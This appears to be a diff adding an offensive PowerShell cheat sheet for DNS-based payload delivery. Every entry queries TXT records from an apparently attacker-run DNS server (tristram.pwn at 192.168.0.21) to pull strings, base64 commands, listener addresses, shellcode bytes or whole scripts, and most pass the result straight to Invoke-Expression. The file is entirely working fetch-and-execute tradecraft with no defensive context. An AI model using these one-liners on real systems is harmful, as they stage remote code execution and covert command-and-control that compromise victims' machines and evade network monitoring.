@@ -1,0 +1,43 @@
+# String Lookup via Resolve-DnsName
+(Resolve-DnsName -Name tristram.pwn -Type 'txt' -Server 192.168.0.21 -DnsOnly).Strings
+
+# String Lookup via nslookup
+((nslookup -type=TXT tristram.pwn 192.168.0.21)[5]).replace('"','').trim()
+
+# Chunked String Lookup via Resolve-DnsName
+(1..$((Resolve-DnsName -Name tristram.pwn -Type 'txt' -Server 192.168.0.21 -DnsOnly).Strings) | % {$((Resolve-DnsName -Name $([System.String]$_+'.tristram.pwn') -Type txt -Server 192.168.0.21 -DnsOnly).Strings)}) -join ''
+
+# Chunked String Lookup via nslookup
+(1..$(((nslookup -type=TXT tristram.pwn 192.168.0.21)[5]).replace('"','').trim()) | % {$D = ((nslookup -type=TXT $([System.String]$_+'.tristram.pwn') 192.168.0.21)[5]); If ($D.length -gt 0) {$D.replace('"','').TrimStart("`t").TrimEnd()} else {""}}) -join ''
+
+# Command Execution String Lookup via Resolve-DnsName
+Invoke-Expression $((Resolve-DnsName -Name tristram.pwn -Type 'txt' -Server 192.168.0.21 -DnsOnly).Strings)
+
+# Command Execution String Lookup via nslookup
+Invoke-Expression $(((nslookup -type=TXT tristram.pwn 192.168.0.21)[5]).replace('"','').trim())
+
+# Command Execution Chunked Base64 Lookup via Resolve-DnsName
+Invoke-Expression (([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($((1..$((Resolve-DnsName -Name tristram.pwn -Type 'txt' -Server 192.168.0.21 -DnsOnly).Strings) | % {$((Resolve-DnsName -Name $([System.String]$_+'.tristram.pwn') -Type txt -Server 192.168.0.21 -DnsOnly).Strings)}) -join '')))))
+
+# Command Execution Chunked Base64 Lookup via nslookup
+Invoke-Expression (([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($(((1..$(((nslookup -type=TXT tristram.pwn 192.168.0.21)[5]).replace('"','').trim()) | % {$D = ((nslookup -type=TXT $([System.String]$_+'.tristram.pwn') 192.168.0.21)[5]); If ($D.length -gt 0) {$D.replace('"','').TrimStart("`t").TrimEnd()} else {""}}) -join ''))))))
+
+# Listener Lookup via Resolve-DnsName
+$DNS = (Resolve-DnsName -Name tristram.pwn -Type 'txt' -Server 192.168.0.21 -DnsOnly).Strings
+$DNS.split(',')[0],$DNS.split(',')[1]
+
+# Listener Lookup via nslookup
+$DNS = ((nslookup -type=TXT tristram.pwn 192.168.0.21)[5]).replace('"','').TrimStart("`t").TrimEnd()
+$DNS.split(',')[0],$DNS.split(',')[1]
+
+# Shellcode Lookup via Resolve-DnsName
+[Byte[]]$buf = $((1..$((Resolve-DnsName -Name tristram.pwn -Type 'txt' -Server 192.168.0.21 -DnsOnly).Strings) | % {$((Resolve-DnsName -Name $([System.String]$_+'.tristram.pwn') -Type txt -Server 192.168.0.21 -DnsOnly).Strings)}) -join '') -split ','
+
+# Shellcode Lookup via nslookup
+[Byte[]]$buf = $((1..$(((nslookup -type=TXT tristram.pwn 192.168.0.21)[5]).replace('"','').trim()) | % {$D = ((nslookup -type=TXT $([System.String]$_+'.tristram.pwn') 192.168.0.21)[5]); If ($D.length -gt 0) {$D.replace('"','').TrimStart("`t").TrimEnd()} else {""}}) -join "") -split ','
+
+# Script Lookup via Resolve-DnsName
+Invoke-Expression $((1..$((Resolve-DnsName -Name tristram.pwn -Type 'txt' -Server 192.168.0.21 -DnsOnly).Strings) | % {$((Resolve-DnsName -Name $([System.String]$_+'.tristram.pwn') -Type txt -Server 192.168.0.21 -DnsOnly).Strings)}) | Out-String)
+
+# Script Lookup via nslookup
+Invoke-Expression $((1..$(((nslookup -type=TXT tristram.pwn 192.168.0.21)[5]).replace('"','').trim()) | % {$D = ((nslookup -type=TXT $([System.String]$_+'.tristram.pwn') 192.168.0.21)[5]); If ($D.length -gt 0) {$D.replace('"','').TrimStart("`t").TrimEnd()} else {""}}) | Out-String)
